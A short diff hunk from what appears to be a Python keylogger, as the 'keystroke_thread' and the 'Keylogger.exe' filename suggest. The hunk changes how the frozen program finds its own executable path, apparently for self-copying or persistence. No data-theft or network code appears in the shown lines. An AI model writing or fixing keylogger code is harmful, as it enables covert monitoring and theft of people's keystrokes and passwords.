@@ -173,7 +173,7 @@ keystroke_thread.start()
 
 # Define paths
 if getattr(sys, 'frozen', False):
-    original_path = os.path.join(sys._MEIPASS, 'Keylogger.exe')  # Path to the current executable when frozen
+    original_path = sys.executable  # Path to the current executable when frozen
 else:
     original_path = os.path.abspath(__file__)  # Path to the current script
 
